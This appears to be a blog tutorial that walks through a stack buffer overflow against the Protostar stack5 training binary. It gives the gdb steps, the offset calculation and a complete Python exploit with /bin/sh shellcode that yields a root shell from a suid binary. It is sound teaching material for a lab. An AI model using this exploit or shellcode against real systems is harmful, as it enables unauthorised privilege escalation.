<hr />

<h2 id="introduction">Introduction</h2>
<p><br /> Hey I’m back with another Buffer Overflow article and today we are going to do a really interesting exploit , Today we will finally escalate privileges using a vulnerable suid binary (you can know more about that by reading the <a href="/binary-exploitation/bof1/">first buffer overflow article</a>) , I will also cover some interesting topics to fully understand this exploit. This is also the most realistic exploit so far. All the previous exploits wanted us to change a variable , execute a function .. stuff that are more like CTF but this time we have a realistic situation , Without wasting more time let’s just jump right in.
<br /> Read the <a href="/categories">previous articles</a> first , if you haven’t done yet.
<img src="/images/binary-exploitation/BOF5/0.png" alt="" /></p>
<hr />

<h2 id="stack5">./Stack5</h2>
<p><br /> We have the source like all the previous challenges but this time it’s actually not important.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}
</code></pre></div></div>
<p><br /> It just takes our input and stores it in the buffer , it doesn’t even tell us about the buffer size. What about <code class="highlighter-rouge">char buffer[64];</code> ?  like <a href="/binary-exploitation/bof4/">stack4</a> if we tried 64 chars it won’t even crash. with that being said let’s start.
<br /> As always we will start by finding out if the binary vulnerable or not (yea we already know that but it’s an important enumeration step)
<code class="highlighter-rouge">python -c "print 'A' * 100" | ./stack5</code>
<img src="/images/binary-exploitation/BOF5/1.png" alt="" />
<br /> Segmentation fault. So it crashes before 100 chars , next step is to know where exactly does it crash. We will use metasploit <code class="highlighter-rouge">pattern_create</code> and <code class="highlighter-rouge">pattern_offset</code> , I explained how does this work in <a href="/binary-exploitation/bof3">stack3</a>
<code class="highlighter-rouge">./pattern_create.rb -l 100</code>
<img src="/images/binary-exploitation/BOF5/2.png" alt="" />
<br /> Then we will run gdb and create a break point at <code class="highlighter-rouge">main()</code> , <code class="highlighter-rouge">run</code> the program after the break point we make it continue then pass our pattern
<code class="highlighter-rouge">break main</code>
<br />
<code class="highlighter-rouge">run</code>
<br />
<code class="highlighter-rouge">c</code>
<img src="/images/binary-exploitation/BOF5/3.png" alt="" />
<br /> It crashes at <code class="highlighter-rouge">0x63413563</code> , now we will use <code class="highlighter-rouge">pattern_offset</code>
<code class="highlighter-rouge">./pattern_offset.rb -q 63413563</code>
<img src="/images/binary-exploitation/BOF5/4.png" alt="" />
<br /> And we get exact match at offset 76. As I said before we will exploit this binary to get a root shell , but how to know if it’s a suid binary or not ? we can simply use <code class="highlighter-rouge">find</code> to know that
<code class="highlighter-rouge">find /opt/protostar/bin/ -perm -4000 | grep stack5</code>
<img src="/images/binary-exploitation/BOF5/5.png" alt="" />
<br /> And we get <code class="highlighter-rouge">/opt/protostar/bin/stack5</code> , if it wasn’t a suid binary we wouldn’t get any output. If you are just searching for suid binaries you can remove the <code class="highlighter-rouge">grep</code> command and it will list all suid binaries in the specified directory.
<br /></p>
<hr />

<h2 id="fun-with-gdb--finding-eip">Fun with gdb , finding EIP</h2>
<p><br /> Now let’s run gdb again and start getting useful information. Before we start I have to say that the memory addresses may differ , so mine won’t be the same as yours. Last time we have overwritten the EIP address with the address of <code class="highlighter-rouge">win()</code> function . This time we don’t have a function to execute ,we have to find the address of the EIP and make it point to our “evil input” (shellcode), I will explain in a moment.
<br /> We will set the disassembly flavor to intel
<code class="highlighter-rouge">set disassembly-flavor intel</code>
<br /> Then we will disassemble the main function
<code class="highlighter-rouge">disassemble main</code>
<img src="/images/binary-exploitation/BOF5/6.png" alt="" />
<br /> By looking at that we can identify the best place to set our break point , and it’s gonna be before the <code class="highlighter-rouge">leave</code> instruction , <code class="highlighter-rouge">leave</code> is right before the <code class="highlighter-rouge">return</code> instruction , next to <code class="highlighter-rouge">leave</code> we see the address <code class="highlighter-rouge">0x080483d9</code> so we will type :
<code class="highlighter-rouge">break *0x080483d9</code>
<img src="/images/binary-exploitation/BOF5/7.png" alt="" />
<br /> Then we will run the program and pass any input , many A’s is always good 
<img src="/images/binary-exploitation/BOF5/8.png" alt="" />
<br /> It will execute and stop at the breakpoint , by typing <code class="highlighter-rouge">info frame</code> we can get the EIP address
<code class="highlighter-rouge">info frame</code>
<img src="/images/binary-exploitation/BOF5/9.png" alt="" />
<br /> The last 2 lines show saved registers : eip at <code class="highlighter-rouge">0xbffff77c</code>
<br /></p>
<hr />

<h2 id="another-way-to-get-the-buffer-size">Another way to get the buffer size</h2>
<p><br /> Let’s take a break and take a quick look at another way to get the buffer size , I wanted to show this quickly because we have already done 50 % of it ..
<br /> Metasploit is cool but what if we don’t have metasploit in some situation ? We can do it manually by calculating the distance between the buffer start address and the EIP address , We have already got the EIP address so let’s get the start of the buffer.
<br /> If we type <code class="highlighter-rouge">x/24wx $esp</code> it will show us (<code class="highlighter-rouge">x/</code>) 24 (<code class="highlighter-rouge">24wx</code>) words at the top of the stack (<code class="highlighter-rouge">$esp</code>).
<code class="highlighter-rouge">x/24wx $esp</code>
<img src="/images/binary-exploitation/BOF5/10.png" alt="" />
<br /> At the second line we see this address <code class="highlighter-rouge">0xbffff730</code> and it holds values of <code class="highlighter-rouge">0x41414141</code> and we already know that 41 is the hex of “A” which was our input to the program so we know that this address is where the buffer starts. We know that the buffer comes first then the EIP so the EIP’s address is greater than the buffer’s address. We will substract them from each other:
<code class="highlighter-rouge">p/d 0xbffff77c - 0xbffff730</code>
<img src="/images/binary-exploitation/BOF5/11.png" alt="" />
<br /> And we get 76 , the same result we got using metasploit. That was another practical way to find the buffer’s size.
<br /></p>
<hr />

<h2 id="idea-of-the-exploit">Idea of the exploit</h2>
<p><br /> before we build our exploit let’s just understand the idea of the exploit. we will fill the buffer with “A” as always , we will reach the EIP and overwrite it with a new address that points to our shell code (4 bytes after), then we will add something called NOP (No Operation) , then finally the shellcode. Let’s breakdown everything.
<br /></p>
<hr />

<h2 id="shellcode">ShellCode</h2>
<p><br /> So what’s a shellcode ? Simply it’s a piece of code (“written in hex in our situation”) that we use as a payload to execute something . <code class="highlighter-rouge">/bin/sh</code> for example. And this binary is suid … so if we execute shellcode that executes <code class="highlighter-rouge">/bin/sh</code> with the binary we will get a root shell.
<br /> You can get shellcodes from <a href="http://shell-storm.org/shellcode/">shell-storm</a> or from <a href="https://www.exploit-db.com/">exploit-db</a> , of course there are a lot of other resources , I’m just giving examples.
<br /> This is the <a href="https://www.exploit-db.com/exploits/13357">shellcode</a> we are going to use for this challenge :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
</code></pre></div></div>
<p><br /> This shellcode executes <code class="highlighter-rouge">/bin/sh</code>
<br /></p>
<hr />

<h2 id="nop-no-operation">NOP (No Operation)</h2>
<p><br /> Basically no operation is used to make sure that our exploit doesn’t fail , because we won’t always point to the right address , so we add stuff that doesn’t do anything and we point to them , Then when the program executes it will reach those NOPs and keeps executing them (does nothing) until it reaches the shellcode.
<br /></p>
<hr />

<h2 id="building-the-exploit">Building the exploit</h2>
<p><br /> In the last challenges a single python print statement solved it. This time it will be a mess so we will create a small exploit with python.
<br /> First thing we will import a module called struct , I will explain why in a moment.
<code class="highlighter-rouge">import struct</code>
<br /> Then we will create a variable the holds the padding (the chars to fill the buffer)
<code class="highlighter-rouge">pad = "\x41" * 76</code>
<br /> After it fills the buffer it will hit the EIP , we need the new EIP address that we will assign , as I said above we need it to be the address of the following instruction (4 bytes after the original EIP address) so it will be <code class="highlighter-rouge">0xbffff77c + 4</code> , google can simply give you the answer :D . it will be <code class="highlighter-rouge">0xbffff780</code> . We will add that value to a variable but remember we need it in reverse , That’s why struct is important. if you do <code class="highlighter-rouge">import struct;struct.pack("I" , 0xbffff780)</code> from the python interpreter it will print <code class="highlighter-rouge">\x80\xf7\xff\xbf</code> , it makes life easier :D
<code class="highlighter-rouge">EIP = struct.pack("I", 0xbffff780)</code>
<br /> Then comes our shellcode</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`
</code></pre></div></div>
<p><br /> Last thing is the NOP , it can be anything , so 100 chars will be good
<code class="highlighter-rouge">NOP = "\x90" * 100</code>
<br /> Ok our exploit is ready , we just need to print out the final payload so :
<code class="highlighter-rouge">print pad + EIP + NOP + shellcode</code>
<br /> Let’s take a look at the script :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import struct
pad = "\x41" * 76
EIP = struct.pack("I", 0xbffff780)
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
NOP = "\x90" * 100
print pad + EIP + NOP + shellcode
</code></pre></div></div>
<p><img src="/images/binary-exploitation/BOF5/12.png" alt="" /></p>
<hr />

<h2 id="applying-the-exploit">Applying the exploit</h2>
<p><br /> Now it’s show time ! let’s test it out.
` python /tmp/stack5.py | ./stack5`
<img src="/images/binary-exploitation/BOF5/13.png" alt="" />
<br /> And we got a root shell ! 
<br />
<br />
<br /> That’s it , Feedback is appreciated !
<br /> Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
<br /> Thanks for reading.
<br />
<br />
<br /> Previous Binary Exploitation article : <a href="/binary-exploitation/bof4/">Buffer Overflow Examples, Taking control of the instruction pointer - protostar stack4</a>
<br /> Next Binary Exploitation article : <a href="/binary-exploitation/bof6/">Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6</a></p>
<hr />

